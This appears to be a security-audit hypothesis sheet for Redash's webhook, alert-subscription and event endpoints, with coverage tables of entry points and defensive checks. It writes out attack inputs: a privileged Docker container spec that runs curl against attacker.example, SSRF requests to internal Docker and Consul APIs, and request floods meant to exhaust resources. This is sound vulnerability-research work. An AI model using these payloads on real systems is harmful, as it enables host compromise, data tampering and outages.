# Round 1 Hypotheses — Webhooks and Destinations

## PH-01: Event webhook used as internal Docker control plane

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/tasks/general.py:14` — `record_event`
- **Attacker starting position**: authenticated-user
- **Attack input**: HTTP POST `/api/events` with JSON body `{"Image":"alpine","Cmd":["/bin/sh","-c","curl http://attacker.example/pwn"],"HostConfig":{"Privileged":true}}` while `EVENT_REPORTING_WEBHOOKS` includes `http://127.0.0.1:2375/containers/create`
- **Chain**: attacker submits event payload → handler enqueues `record_event` → worker posts raw JSON to event webhook URL → internal Docker daemon accepts body as container spec → privileged container is created
- **Catastrophe / Dangerous fallback**: internal host compromise via container creation on the Redash host
- **Severity estimate**: CRITICAL
- **Read needed**: anatomy sufficient
- **Deepening direction**: confirm whether `/api/events` is auth-protected and whether event payload is forwarded verbatim to `requests.post`

---

## PH-02: Non-admin uses destination subscription to trigger internal SSRF

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/handlers/alerts.py:116` — `AlertSubscriptionListResource.post`
- **Attacker starting position**: authenticated-user
- **Attack input**: HTTP POST `/api/alerts/{id}/subscriptions` with JSON `{ "destination_id": 42 }` where destination 42 is a webhook targeting `http://127.0.0.1:8500/v1/kv/critical?raw=`
- **Chain**: user subscribes to admin-configured webhook destination → user triggers `/api/alerts/{id}/evaluate` → `AlertSubscription.notify` sends POST to internal Consul API → internal key/value state is modified
- **Catastrophe / Dangerous fallback**: internal configuration tampering by a non-admin user via webhook delivery
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: verify whether non-admin users can select any destination_id in org and whether payload fields are sufficient to influence the internal endpoint

---

## PH-03: Admin-configured webhook used to prune internal containers

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/destinations/webhook.py:29` — `Webhook.notify`
- **Attacker starting position**: authenticated-admin
- **Attack input**: HTTP POST `/api/destinations` with JSON `{ "type": "webhook", "name": "internal-prune", "options": { "url": "http://127.0.0.1:2375/containers/prune" } }`, then POST `/api/alerts/{id}/evaluate` to trigger
- **Chain**: admin creates destination with internal Docker endpoint → alert evaluation invokes webhook notify → Redash issues POST to Docker prune endpoint → containers are deleted
- **Catastrophe / Dangerous fallback**: internal service destruction / outage through SSRF to privileged local APIs
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: confirm destination URL is used directly with `requests.post` and no private-address blocking exists

---

## PH-04: Alert evaluation floods webhooks despite should-notify gate

- **Reasoning-Model**: Pre-Mortem + Abductive
- **Target**: `redash/handlers/alerts.py:56` — conditional update in `AlertEvaluateResource.post`
- **Attacker starting position**: authenticated-user (alert owner)
- **Attack input**: repeated HTTP POST `/api/alerts/{id}/evaluate` calls within the rearm window
- **Chain**: attacker repeatedly triggers evaluation → `should_notify` returns False but handler still calls `notify_subscriptions` → outbound webhook POSTs continue anyway → destination endpoints are flooded
- **Catastrophe / Dangerous fallback**: high-volume outbound request flood (DoS or rate-limit bans) against internal or external endpoints
- **Severity estimate**: MEDIUM
- **Read needed**: anatomy sufficient
- **Deepening direction**: validate `should_notify` return values and confirm notification happens even when rearm threshold is not met

---

## PH-05: Event ingestion used for database and worker exhaustion

- **Reasoning-Model**: Pre-Mortem
- **Target**: `redash/handlers/events.py:60` — `EventsResource.post`
- **Attacker starting position**: authenticated-user
- **Attack input**: HTTP POST `/api/events` with a JSON array of 10,000 events, each containing multi-megabyte strings in fields like `action` and `object_type`
- **Chain**: attacker submits oversized event list → web process enqueues record_event jobs → worker inserts each event into DB and forwards to hooks → DB growth and queue backlog exhaust resources
- **Catastrophe / Dangerous fallback**: storage exhaustion and job queue saturation, impairing alert delivery and core application availability
- **Severity estimate**: HIGH
- **Read needed**: anatomy sufficient
- **Deepening direction**: check request size limits and whether events are rate-limited or truncated before DB insert

---

## Coverage Check

| Entry Point | Pre-Mortem covered? | Abductive covered? |
|------------|:-:|:-:|
| `redash/handlers/destinations.py:80-134` — `DestinationListResource.post` | PH-03 | NO — not applicable (no defensive pattern) |
| `redash/handlers/destinations.py:35-61` — `DestinationResource.post` | PH-03 | NO — not applicable (no defensive pattern) |
| `redash/handlers/destinations.py:21-33` — `DestinationResource.get` | NO — read-only | NO — not applicable |
| `redash/handlers/destinations.py:63-77` — `DestinationResource.delete` | NO — destructive but no outbound effects | NO — not applicable |
| `redash/handlers/alerts.py:116-141` — `AlertSubscriptionListResource.post` | PH-02 | NO — not applicable (no defensive pattern) |
| `redash/handlers/alerts.py:50-63` — `AlertEvaluateResource.post` | PH-04 | PH-04 |
| `redash/handlers/alerts.py:85-107` — `AlertListResource.post` | PH-02 | NO — not applicable |
| `redash/handlers/base.py:50-61` — `record_event` | PH-01 / PH-05 | NO — not applicable |
| `redash/tasks/general.py:14-30` — `record_event` job | PH-01 / PH-05 | NO — not applicable |

| Defensive Pattern | Abductive hypothesis generated? |
|------------------|:-:|
| `redash/destinations/webhook.py:30` try/except | NO — logs and returns only |
| `redash/destinations/webhook.py:50` status code check | NO — logs only |
| `redash/destinations/webhook.py:42` conditional auth | NO — expected behavior |
| `redash/destinations/slack.py:52` try/except | NO — logs and returns only |
| `redash/destinations/slack.py:55` status code check | NO — logs only |
| `redash/destinations/discord.py:57` try/except | NO — logs and returns only |
| `redash/destinations/discord.py:64` status code check | NO — logs only |
| `redash/destinations/mattermost.py:46` try/except | NO — logs and returns only |
| `redash/destinations/mattermost.py:50` status code check | NO — logs only |
| `redash/destinations/hangoutschat.py:41` try/except | NO — logs and returns only |
| `redash/destinations/hangoutschat.py:70` null check | NO — UI-only behavior |
| `redash/destinations/hangoutschat.py:90` status code check | NO — logs only |
| `redash/destinations/microsoft_teams_webhook.py:18` fallback value | NO — returns original template |
| `redash/destinations/microsoft_teams_webhook.py:81` try/except | NO — logs and returns only |
| `redash/destinations/microsoft_teams_webhook.py:108` status code check | NO — logs only |
| `redash/destinations/chatwork.py:33` try/except | NO — logs and returns only |
| `redash/destinations/chatwork.py:58` status code check | NO — logs only |
| `redash/destinations/webex.py:43` try/except | NO — fallback formatting only |
| `redash/destinations/webex.py:106` fallback value | NO — fallback formatting only |
| `redash/destinations/webex.py:202` null check | NO — skip send |
| `redash/destinations/webex.py:208` length/bounds check | NO — skip send |
| `redash/destinations/webex.py:216` try/except | NO — logs and returns only |
| `redash/destinations/webex.py:224` status code check | NO — logs only |
| `redash/destinations/datadog.py:84` try/except | NO — logs and returns only |
| `redash/destinations/datadog.py:87` status code check | NO — logs only |
| `redash/destinations/datadog.py:71` fallback value | NO — default tags only |
| `redash/destinations/asana.py:50` try/except | NO — logs and returns only |
| `redash/destinations/asana.py:58` status code check | NO — logs only |
| `redash/destinations/email.py:33` length/bounds check | NO — skip send |
| `redash/destinations/email.py:36` fallback value | NO — template fallback only |
| `redash/destinations/email.py:43` try/except | NO — logs and returns only |
| `redash/tasks/alerts.py:14` try/except | NO — logs and continues |
| `redash/tasks/alerts.py:22` null check | NO — timing guard only |
| `redash/tasks/alerts.py:46` redundant check | NO — skip notification |
| `redash/tasks/alerts.py:50` null check | NO — skip notification |
| `redash/tasks/general.py:19` try/except | NO — logs and continues |
| `redash/tasks/general.py:27` status code check | NO — logs only |
| `redash/tasks/general.py:56` try/except | NO — logs and returns only |
| `redash/tasks/general.py:65` try/except | NO — returns exception object |
| `redash/tasks/general.py:75` try/except | NO — returns error dict |
| `redash/tasks/general.py:87` try/except | NO — returns error dict |
| `redash/handlers/destinations.py:40` null check | NO — schema enforcement |
| `redash/handlers/destinations.py:51` try/except | NO — validation only |
| `redash/handlers/destinations.py:53` try/except | NO — integrity error handling |
| `redash/handlers/destinations.py:108` null check | NO — schema enforcement |
| `redash/handlers/destinations.py:112` validation check | NO — schema enforcement |
| `redash/handlers/destinations.py:126` try/except | NO — integrity error handling |
| `redash/handlers/alerts.py:56` conditional update | PH-04 |
| `redash/handlers/base.py:66` required fields | NO — input validation only |
| `redash/handlers/base.py:73` null check | NO — not exploitable |
| `redash/handlers/base.py:75` try/except | NO — not exploitable |
| `redash/handlers/base.py:83` bounds check | NO — paging guard |
| `redash/handlers/base.py:86` bounds check | NO — paging guard |
| `redash/handlers/base.py:89` bounds check | NO — paging guard |
| `redash/handlers/events.py:11` null check | NO — geo lookup guard |
| `redash/handlers/events.py:15` try/except | NO — geo lookup guard |
| `redash/models/__init__.py:1468` null check | NO — email fallback, no privilege gain identified |

| Trust Chain Gap | Backward chain traced? |
|----------------|:-:|
| Destination URLs validated only by schema type/required fields; no protocol/domain allowlist and no SSRF guard on outbound requests. | PH-03 / PH-02 |
| Event reporting webhooks use environment-configured URLs, bypassing destination validation entirely. | PH-01 |
| All destinations use raw `requests.post` (no `requests_or_advocate` or private-address blocking), so internal/metadata endpoints remain reachable if configured. | PH-03 / PH-02 |
